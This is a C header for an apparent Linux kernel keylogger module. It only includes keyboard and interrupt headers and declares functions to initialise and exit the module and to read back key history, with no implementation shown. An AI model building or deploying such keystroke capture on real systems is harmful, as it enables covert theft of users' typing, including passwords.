#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/keyboard.h>
#include <linux/irq.h>
#include <linux/interrupt.h>

char *read_key_history(void);
int __init keylogger_init(void);
void keylogger_exit(void);

#endif